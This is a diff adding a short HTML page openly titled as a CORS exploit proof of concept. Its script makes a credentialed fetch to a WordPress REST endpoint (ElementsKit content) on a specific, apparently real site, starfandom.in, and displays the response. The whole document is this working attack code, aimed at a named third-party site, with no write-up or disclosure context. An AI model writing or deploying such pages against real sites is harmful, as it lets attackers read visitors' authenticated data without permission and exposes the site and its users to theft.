@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CORS Exploit PoC</title>
+  </head>
+  <body>
+    <h1>CORS Exploit in Action</h1>
+    <pre id="output">Loading...</pre>
+
+    <script>
+      fetch("https://starfandom.in/wp-json/wp/v2/elementskit-content/345", {
+        method: "GET",
+        credentials: "include"  // include cookies if vulnerable with credentials
+      })
+      .then(response => {
+        if (!response.ok) throw new Error("Network error");
+        return response.text();
+      })
+      .then(data => {
+        document.getElementById("output").textContent = data;
+      })
+      .catch(err => {
+        document.getElementById("output").textContent = "Error: " + err;
+      });
+    </script>
+  </body>
+</html>
